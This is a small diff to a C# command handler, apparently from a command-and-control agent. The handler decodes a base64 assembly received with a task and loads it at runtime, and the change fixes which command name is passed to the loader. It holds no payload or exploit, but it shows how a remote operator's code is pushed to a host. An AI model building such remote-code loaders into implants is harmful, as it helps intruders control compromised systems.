@@ -405,7 +405,7 @@ namespace Athena.Commands
         {
             LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
             byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
-            return await assemblyHandler.LoadCommandAsync(job.task.id, job.task.command, buf);
+            return await assemblyHandler.LoadCommandAsync(job.task.id, command.command, buf);
 
             //
             //byte[] magBytes = new byte[] { buf[0], buf[1] };
